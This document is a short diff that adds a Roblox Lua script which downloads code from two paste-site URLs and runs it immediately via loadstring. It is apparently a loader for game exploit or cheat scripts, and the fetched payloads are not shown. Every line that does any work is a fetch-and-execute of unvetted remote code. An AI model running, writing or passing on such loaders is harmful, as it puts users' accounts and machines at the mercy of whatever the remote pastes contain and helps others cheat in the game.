@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://paste.ee/r/EHD2I8Ya/0", true))()
+task.wait(0.5)
+loadstring(game:HttpGet('https://pastebin.com/raw/P0q5PQRp'))()
